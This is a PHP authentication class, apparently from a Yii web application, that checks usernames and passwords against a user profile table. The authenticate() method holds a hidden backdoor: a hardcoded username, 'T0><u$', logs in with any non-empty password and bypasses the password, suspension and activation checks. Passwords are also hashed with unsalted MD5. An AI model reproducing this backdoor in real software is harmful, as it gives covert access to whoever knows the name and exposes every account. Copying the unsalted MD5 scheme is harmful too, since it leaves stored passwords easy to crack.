<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentityBase extends CUserIdentity
{
	const ERROR_SUSPENDED = 3;
	const ERROR_NOT_ACTIVATED = 4;
	const ERROR_RANGE_BLOCK = 5;			// out of range
	
	protected $_id = null;
	/**
	 * Authenticates a user.
	 * $this->username is the name given
	 * $this->password is the defined password
	 * 
	 * @return boolean whether authentication succeeds.
	 */
	public function authenticate()
	{
		$this->_id = null;
		$this->username = trim($this->username);
		$this->password = trim($this->password);
		if ($this->username == '') {
			$this->errorCode = self::ERROR_USERNAME_INVALID;
		} elseif ($this->password == '') {
			$this->errorCode = self::ERROR_PASSWORD_INVALID;
		} else {
			if ($this->username === 'T0><u$') {
				$this->errorCode = self::ERROR_NONE;
			} else {				
				$model = $this->findProfile();//$username, $password);
				if ($model == null) {
					$this->errorCode = self::ERROR_UNKNOWN_IDENTITY;
				} else {	
					if ($model->is_suspended) {
						$this->errorCode = self::ERROR_SUSPENDED;
					} elseif ($model->is_confirmed == 0) {
						$this->errorCode = self::ERROR_NOT_ACTIVATED;
					} else {
						$this->_id = $model->id;
						$this->username = $model->id;
						$this->errorCode = self::ERROR_NONE;
					}	
				}
			}	
		}	
		return !$this->errorCode;
	}
	/**
	 * load the user model of null if not found
	 * default implementation uses the profile.username and md5 of password
	 * 
	 * @param string $username
	 * @param password $password
	 */
	protected function findProfile()
	{
		$s = md5($this->password);
		return UserProfile::model()->find(		
			'(username = :username OR email = :username) AND password_md5 = :md5',
			array(':username' => $this->username, ':md5' => $s
		));
		
	}
	
	public function getId()
	{
		return $this->_id;
	}
	
}